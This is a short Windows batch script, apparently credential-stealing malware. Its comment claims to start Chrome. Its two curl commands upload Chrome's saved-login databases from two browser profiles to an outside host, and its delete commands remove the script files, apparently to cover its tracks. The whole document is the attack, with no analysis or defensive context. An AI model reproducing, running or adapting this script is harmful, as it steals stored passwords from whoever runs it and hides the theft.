::start chrome 
del "boot.bat"
curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 1/Login Data" https://sprucebot.tech/fsend
curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 2/Login Data" https://sprucebot.tech/fsend
del "system.bat"
exit
